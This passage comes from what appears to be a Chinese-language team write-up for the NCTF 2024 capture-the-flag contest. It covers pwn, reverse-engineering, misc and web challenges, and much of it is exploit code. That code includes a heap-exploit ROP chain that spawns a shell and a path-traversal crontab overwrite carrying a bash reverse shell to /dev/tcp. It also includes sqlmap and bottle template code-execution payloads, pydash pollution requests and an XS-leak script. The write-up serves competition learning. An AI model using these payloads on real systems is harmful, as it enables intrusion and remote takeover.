p64(fake_io_addr))\n\nsystem=libc+0x58750\nenviron=libc+0x20ad58\n_IO_wfile_jumps=libc+0x202228\nsetcontext=libc+0x4a99d\n\nrop_addr=heap+0x850\nrax=libc+0xdd237\nrdi=libc+0x158748\nrsi=libc+0x02b46b\nsyscall=libc+0x127185+4\nrsp=libc+0x5ef6f\nrdx=libc+0x162e3a\n\nrop=p64(rax)+p64(0x21)\nrop+=p64(rdi)+p64(4)+p64(0)*5\nrop+=p64(rsi)+p64(0)*2\nrop+=p64(syscall)\n\nrop+=p64(rax)+p64(0x21)\nrop+=p64(rdi)+p64(4)+p64(0)*5\nrop+=p64(rsi)+p64(1)*2\nrop+=p64(syscall)\n\nrop+=p64(rax)+p64(0x3b)\nrop+=p64(rdi)+p64(heap+0xd20)+p64(0)*5\nrop+=p64(rsi)+p64(0)+p64(heap+0x978+0x28)\nrop+=p64(rdx)+p64(0)*3+p64(heap+0x978+0x28)\nrop+=p64(syscall)\n\nedit(5, rop)\n\nfake_io = flat({\n    0x0: \" sh;\",\n    0x10: p64(setcontext),\n    0x20: p64(stdout),\n    0x88: p64(rop_addr),  # _lock\n    0xa0: p64(stdout),\n    0xa8: p64(rsp),\n    0xd8: p64(_IO_wfile_jumps + 0x10),\n    0xe0: p64(stdout-8),\n}, filler=b\"\\x00\")\n\n\nadd(0x101, fake_io)\nshell()\n```\n\n\n\n## RE\n\n### ezDOS\n\n程序中间出现的花指令都直接nop去除，然后Apply patch到程序。\n\n![](/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png)\n\n程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。\n\n![](/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png)\n\n使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符'1'。\n\n![](/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png)\n\n![](/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png)\n\n直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。\n\n> 32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1\n\n取出0x142地址的38字节，进行异或即可得到解密flag。\n\n![](/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png)\n\n### SafeProgram\n\n核心加密是一个SM4加密。\n\n![](/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png)\n\n查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。\n\n![](/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png)\n\n![](/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png)\n\n发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。\n\n![](/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png)\n\n![](/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png)\n\n![](/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png)\n\n然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。\n\n![](/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png)\n\nmain函数可以看到要求输入格式为NCTF{...}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。\n\n![](/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png)\n\n动调时提取这三个数组数据，进行解密即可。\n\n![](/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png)\n\nkey是main函数两次memcpy那边的数据，结果如下。\n\n![](/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png)\n\n解密代码：\n\n\n\n```cpp\n#include <iostream>\n#include <string>\n#include <windows.h>\n#include <vector>\n\nunsigned char byte_7FF699A4A0D0[256] = {\n0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,\n0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,\n0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,\n0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8,\n0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,\n0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87,\n0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E,\n0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,\n0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,\n0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F,\n0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,\n0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8,\n0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0,\n0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,\n0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48\n};\n\nunsigned int dword_7FF699A4A040[32] = {\n0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,\n0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,\n0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,\n0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279\n};\nunsigned int dword_7FF699A4A028[4] = {\n0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC\n};\n\nstatic inline uint32_t rotate_left(uint32_t x, int n) \n{\n    return (x << n) | (x >> (32 - n));\n}\n\nstatic void generate_buf(const uint8_t* key, uint32_t* buf) \n{\n    for (int i = 0; i < 4; i++) \n        {\n            uint32_t key_dword;\n            memcpy(&key_dword, key + 4 * i, 4);\n            uint32_t converted_key = ((key_dword & 0xFF) << 24) |\n            ((key_dword & 0xFF00) << 8) |\n            ((key_dword >> 8) & 0xFF00) |\n            ((key_dword >> 24) & 0xFF);\n            buf[i] = dword_7FF699A4A028[i] ^ converted_key;\n        }\n    for (int j = 0; j < 32; j++) \n        {\n            uint32_t v12 = dword_7FF699A4A040[j] ^ buf[j + 3] ^ buf[j + 2] ^ buf[j + 1];\n            uint8_t* v12_bytes = (uint8_t*)&v12;\n            for (int k = 0; k < 4; k++)\n                {\n                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];\n        }\n        uint32_t rot1 = rotate_left(v12, 23);\n        uint32_t rot2 = rotate_left(v12, 13);\n        buf[j + 4] = (rot1 ^ rot2 ^ v12) ^ buf[j];\n    }\n}\n\nvoid decrypt(const uint8_t* ciphertext, const uint8_t* key, uint8_t* plaintext)\n{\n    uint32_t buf[36] = { 0 };\n    uint32_t buf_1[36] = { 0 };\n\n    generate_buf(key, buf);\n\n    for (int ii = 0; ii < 4; ii++)\n    {\n        uint32_t cipher_dword;\n        memcpy(&cipher_dword, ciphertext + 4 * ii, 4);\n        buf_1[35 - ii] = ((cipher_dword >> 24) & 0xFF) |\n            ((cipher_dword >> 8) & 0xFF00) |\n            ((cipher_dword << 8) & 0xFF0000) |\n            ((cipher_dword << 24) & 0xFF000000);\n    }\n\n    for (int m = 31; m >= 0; m--)\n    {\n        uint32_t v12_0 = buf[m + 4] ^ buf_1[m + 3] ^ buf_1[m + 2] ^ buf_1[m + 1];\n        uint8_t* v12_bytes = (uint8_t*)&v12_0;\n        for (int n = 0; n < 4; n++) \n        {\n            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];\n        }\n        uint32_t rot1 = rotate_left(v12_0, 24);\n        uint32_t rot2 = rotate_left(v12_0, 18);\n        uint32_t rot3 = rotate_left(v12_0, 10);\n        uint32_t rot4 = rotate_left(v12_0, 2);\n        uint32_t L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;\n        buf_1[m] = buf_1[m + 4] ^ L_result;\n    }\n\n    for (int i = 0; i < 4; i++)\n    {\n        uint32_t v11 = buf_1[i];\n        uint8_t b0 = (v11 >> 24) & 0xFF;\n        uint8_t b1 = (v11 >> 16) & 0xFF;\n        uint8_t b2 = (v11 >> 8) & 0xFF;\n        uint8_t b3 = v11 & 0xFF;\n        uint32_t le = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0;\n        memcpy(plaintext + 4 * i, &le, 4);\n    }\n}\n\nint main_safe()\n{\n    uint8_t key[] = \"NCTF24nctfNCTF24\";\n    unsigned char enc[32] = {\n    0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF, 0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C,\n    0x14, 0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3, 0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46\n    };\n\n    unsigned char flag[32]{};\n    decrypt(enc, key, flag);\n    decrypt(enc+16, key, flag+16);\n\n    printf(\"NCTF{%.32s}\\n\", flag);\n    \n    return 0;\n}\n```\n\n### gogo\n\nmain_main函数可以看到是将输入分块通过channel进行协程通信。\n\n![](/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png)\n\n在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。\n\n![](/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png)\n\n![](/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png)\n\n对每个vm的函数都下断点输出，如XOR这样：\n\n![](/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png)\n\n![](/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png)\n\n运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。\n\n![](/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png)\n\n![](/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png)\n\n通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。\n\n还原加密代码如下，基于标准XXTEA进行修改的：\n\n```cpp\n#define DELTA 0x9e3779b9\n\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\n#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))\n\nuint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };\n\nuint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };\n\nvoid xxtea_1(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    rounds = 16;\n    sum = 0;\n    z = v[n - 1];\n    do\n    {\n        sum += DELTA;\n        e = (sum >> 2) & 3;\n        for (p = 0; p < 5; p++)\n        {\n            y = v[(p + 1) % 5];\n            z = v[p] += MX;\n        }\n    } while (--rounds);\n}\n\nvoid xxtea_2(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    rounds = 16;\n    sum = 0;\n    z = v[n - 1];\n    do\n    {\n        sum += DELTA;\n        e = (sum >> 2) & 3;\n        for (p = 0; p < 5; p++)\n        {\n            y = v[(p + 1) % 5];\n            z = v[p] += MX2;\n        }\n    } while (--rounds);\n}\n```\n\n在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。\n\n![](/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#define DELTA 0x9e3779b9\n\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\n#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))\n\nuint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };\n\nuint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };\n\nvoid xxtea_decrypt1(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned rounds, e;\n    rounds = 16;\n    sum = DELTA * rounds;\n    y = v[0]; \n    do\n    {\n        e = (sum >> 2) & 3;\n        for (int p = 5 - 1; p >= 0; p--)\n        {\n            if (p == 0)\n                z = v[4];\n            else\n                z = v[(p-1)%5];\n\n            if (p == 4)\n                y = v[0];\n            else\n                y = v[p + 1];\n\n            v[p] -= MX;\n            \n        }\n        sum -= DELTA;\n    } while (--rounds);\n}\n\nvoid xxtea_decrypt2(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned rounds, e;\n    rounds = 16;\n    sum = DELTA * rounds;\n    y = v[0];\n    do\n    {\n        e = (sum >> 2) & 3;\n        for (int p = 5 - 1; p >= 0; p--)\n        {\n            if (p == 0)\n                z = v[4];\n            else\n                z = v[(p - 1) % 5];\n\n            if (p == 4)\n                y = v[0];\n            else\n                y = v[p + 1];\n\n            v[p] -= MX2;\n\n        }\n        sum -= DELTA;\n    } while (--rounds);\n}\n\nint main()\n{\n    unsigned char enc1[] =\n    {\n      0x5D, 0x45, 0xD5, 0xB9, 0x8C, 0x95, 0x9C, 0x38, 0x3B, 0xB1,\n      0x3E, 0x1E, 0x5F, 0xC8, 0xE8, 0xBB, 0x64, 0x38, 0x48, 0x69\n    };\n    unsigned char enc2[] =\n    {\n      0xDE, 0x81, 0xD8, 0xAD, 0xC2, 0xC4, 0xA6, 0x32, 0x1C, 0xAB,\n      0x61, 0x3E, 0xCB, 0xFF, 0xEF, 0xF1, 0x27, 0x30, 0x7A, 0x16\n    };\n\n    xxtea_decrypt1((uint32_t*)enc1, 5);\n    xxtea_decrypt2((uint32_t*)enc2, 5);\n    \n    printf(\"%.20s%.20s\\n\", enc1,enc2);\n\n    return 0;\n}\n```\n\n\n\n## MISC \n\n### <font style=\"color:#000000;\">X1crypsc</font>\n\n题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。\n\n```python\nfrom pwn import *\nfrom random import Random\nimport sys\nfrom Crypto.Util.number import *\nfrom random import *\nfrom tqdm import *\n\n# ==========================\n#  Phase 1: 收集PRNG输出数据\n# ==========================\ndef collect_bits(p):\n    print(\"[+] Collecting 624*32 bits for MT19937 state...\")\n    \n    bits_collected = 0\n    D=[]\n    while bits_collected < 625 * 32:  \n        p.sendlineafter(b'option:', b'W')  # 选择武器刷新\n        p.recvuntil(b'Current attack value: ')\n        line = p.recvline().decode()\n        low, high = map(int, line.split(' ~ '))\n        base = low\n        add = high - base \n        \n        val1 = base\n        val2 = add\n\n        D.append(val1)\n        D.append(val2)\n        p.sendline(b'y')\n        bits_collected += 32\n        \n        sys.stdout.write(f\"\\rBits collected: {bits_collected}/20000\")\n        sys.stdout.flush()\n        \n        # 发送'n'不继续刷新\n        p.sendlineafter(b'?', b'n')\n\n    print(len(D))\n    return D\n\n# ==========================\n#  Phase 2: 预测坐标并攻击\n# ==========================\ndef attack_monster(p, predictor,D):\n    print('[+]')\n    while True:\n        # 预测下一个randrange(2025) x和y\n        x = predictor.randrange(2025)\n        y = predictor.randrange(2025)\n        print(x,y)\n        # 发送攻击指令\n        p.recvuntil(b'option:')\n        p.sendline(b'A')\n        p.recvuntil(b'aim:')\n        p.sendline(f\"{x} {y}\".encode())\n        \n        resp = p.recvuntil(b'\\n').decode()\n        \n        a=predictor.randint(D[-2],D[-1])\n        if b'Victory' in p.recvline():\n            print('-------------------------------------------------')\n            print(p.recv(1000))\n            return\n    \n\n#--------------------------------------------------------------\n\ncontext(log_level=\"debug\")\np = remote('39.106.16.204', 11448) \n\nDall = collect_bits(p)\nprint(Dall)\n\nn=1250\nD=Dall[:n]\nrng=Random()\n\ndef getRows(rng):\n    row=[]\n    for i in range(n):\n        row+=list(map(int, (bin(rng.getrandbits(16))[2:].zfill(16))))\n    return row\nM=[]\nfor i in (range(19968)):\n    state = [0]*624\n    temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i)\n    for j in range(624):\n        state[j] = int(temp[32*j:32*j+32],2)\n    rng.setstate((3,tuple(state+[624]),None)) \n    M.append(getRows(rng))\n    \nprint('--------------------------------------------------')\nM=Matrix(GF(2),M)\ny=[]\nfor i in range(n):\n    y+=list(map(int, (bin(D[i])[2:].zfill(16))))\ny=vector(GF(2),y)\ns=M.solve_left(y)\nG=[]\nfor i in range(624):\n    C=0\n    for j in range(32):\n        C<<=1\n        C|=int(s[32*i+j])\n    G.append(C)\nimport random\nRNG1 = random.Random()\nfor i in range(624):\n    G[i]=int(G[i])\nRNG1.setstate((int(3),tuple(G+[int(624)]),None))\n\n#------------------------------------------------------------\n#控制到当前状态\nRNG1.getrandbits(64)\nss=0\nd1=[]\nwhile ss < 625 * 32:\n    d1.append(RNG1.getrandbits(16))\n    d1.append(RNG1.getrandbits(16))\n    ss += 32\n\nprint(d1[-10:-1])\n\n\nprint('------------att-------------')\nattack_monster(p, RNG1,Dall)\n\np.interactive()\n\n#--------------------------------------------------------------\n```\n\n黑盒部分：\n\n只有输入文件名以及输入文件内容这些功能\n\n发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控\n\n```bash\n....//....//....//....//etc/crontab\n\nSHELL=/bin/sh\n\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'\n```\n\n获得shell后寻找flag\n\n```bash\n#linux命令：\nfind / -type f -exec grep -l -i \"nctf\" {} + 2>/dev/null\n\n#Out:\n/proc/1/task/1/environ\n\n#linux命令：\ncat /proc/1/task/1/environ\n\n#Out：\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=comp-xlcrypsc-67706716887745083pclt4FLAG=nctf{760bd839-02ff-4b4f-b5a9-3b006910963a}KUBERNETES_PORT=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_ADDR=192.168.0.1KUBERNETES_SERVICE_HOST=192.168.0.1KUBERNETES_SERVICE_PORT=443KUBERNETES_SERVICE_PORT_HTTPS=443HOME=/root\n\n```\n\n### QRcode Reconstruction\n\n![](/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png)手搓。\n\n最后decode是\n\n![](/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png)\n\n猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}\n\n## CRYPTO\n\n爆零O.o\n","slug":"NCTF24-不知道-WP","published":1,"updated":"2025-04-14T12:11:17.703Z","comments":1,"layout":"post","photos":[],"_id":"cm9r3mmep0005f0lscmmufd8y","content":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名：6</strong></p>\n<p>成员：LamentXU、Jerrythepro123、lianjin、Liv</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png\" loading=\"lazy\"></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><p>拉门特许超级无敌详细版：</p>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/LAMENTXU/articles/18799383\">https://www.cnblogs.com/LAMENTXU/articles/18799383</a></p>\n</blockquote>\n<h3 id=\"sqlmap-master\"><a href=\"#sqlmap-master\" class=\"headerlink\" title=\"sqlmap-master\"></a>sqlmap-master</h3><p>签到题。</p>\n<p>sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕</p>\n<p>payload：</p>\n<blockquote>\n<p>127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729’))</p>\n</blockquote>\n<h3 id=\"ez-dash\"><a href=\"#ez-dash\" class=\"headerlink\" title=\"ez_dash\"></a>ez_dash</h3><p>我是第一个报告非预期的（大声）</p>\n<p>根本不需要污染。bottle里&lt;%也可以执行，waf没禁完。</p>\n<p>直接打abort回显。秒了。</p>\n<blockquote>\n<p>GET &#x2F;render?path&#x3D;&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa&#x3D;getoutput(“env”)%0aabort(404,a)%20%&gt;</p>\n</blockquote>\n<h3 id=\"ez-dash-revenge\"><a href=\"#ez-dash-revenge\" class=\"headerlink\" title=\"ez_dash_revenge\"></a>ez_dash_revenge</h3><p>首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__</p>\n<blockquote>\n<p>POST &#x2F;setValue?name&#x3D;pydash HTTP&#x2F;1.1</p>\n<p>{</p>\n<p>“path”: “helpers.RESTRICTED_KEYS”,</p>\n<p>“value”: “123”</p>\n<p>}</p>\n</blockquote>\n<p>然后setval找globals找bottle。改templete的路径，加一个&#x2F;proc&#x2F;self</p>\n<blockquote>\n<p>POST &#x2F;setValue?name&#x3D;setval HTTP&#x2F;1.1</p>\n<p>{</p>\n<p>“path”: “<strong>globals</strong>.bottle.TEMPLATE_PATH”,</p>\n<p>“value”: [“.&#x2F;“,”.&#x2F;views&#x2F;“,</p>\n<pre><code>&quot;/proc/self/&quot;\n</code></pre>\n<p>]</p>\n<p>}</p>\n</blockquote>\n<p>随后直接render?path&#x3D;environ即可</p>\n<h3 id=\"internal-api\"><a href=\"#internal-api\" class=\"headerlink\" title=\"internal_api\"></a>internal_api</h3><p>XS_leak，通过请求码来泄露。</p>\n<p>exp：</p>\n<pre class=\"language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Error-Based Attack<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n        <span class=\"token keyword\">let</span> currentFlag <span class=\"token operator\">=</span> <span class=\"token string\">\"nctf&#123;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> chars <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdef0123456789-&#123;&#125;\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">function</span> <span class=\"token function\">checkCharacter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">char</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">let</span> script <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'script'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                script<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://0.0.0.0:8000/internal/search?s=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>char<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n\n                script<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token 